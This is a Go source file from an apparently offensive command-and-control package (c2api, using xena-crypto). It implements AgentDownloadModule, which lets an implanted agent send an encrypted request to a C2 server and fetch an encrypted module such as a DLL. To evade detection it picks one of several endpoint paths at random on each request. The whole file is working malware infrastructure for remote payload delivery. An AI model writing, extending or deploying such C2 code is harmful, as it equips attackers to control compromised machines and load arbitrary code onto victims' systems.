package c2api

import (
	"bytes"
	"crypto/rsa"
	"encoding/json"
	"errors"
	"io"
	"net/http"

	cry "github.com/zarkones/xena-crypto"
)

type AgentModuleReqCtx struct {
	AgentID    string `json:"agentId"`
	ModuleName string `json:"moduleName"` // Example: HELLO_WORLD.DLL
}

func AgentDownloadModule(agentID, moduleName string, decryptionKey *rsa.PrivateKey) (module string, err error) {
	if TrustedPubKey == nil {
		return "", ErrTrustedKeyIsNil
	}

	payload, err := json.Marshal(AgentModuleReqCtx{AgentID: agentID, ModuleName: moduleName})
	if err != nil {
		return "", err
	}

	encryptedPayload, err := cry.SecureWrap(TrustedPubKey, string(payload))
	if err != nil {
		return "", err
	}

	endpointPaths := RouteMap[R_MODULE_DOWNLOAD]
	endpointPath := randElem(&endpointPaths)
	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/"+endpointPath, bytes.NewReader([]byte(encryptedPayload)))
	if err != nil {
		return "", err
	}

	resp, err := c.Do(req)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != http.StatusOK {
		return "", errors.Join(ErrUnexpectedStatusCode, errors.New(resp.Status))
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	decrypted, err := cry.SecureUnwrap(decryptionKey, string(respBody))
	if err != nil {
		return "", err
	}

	return decrypted, nil
}
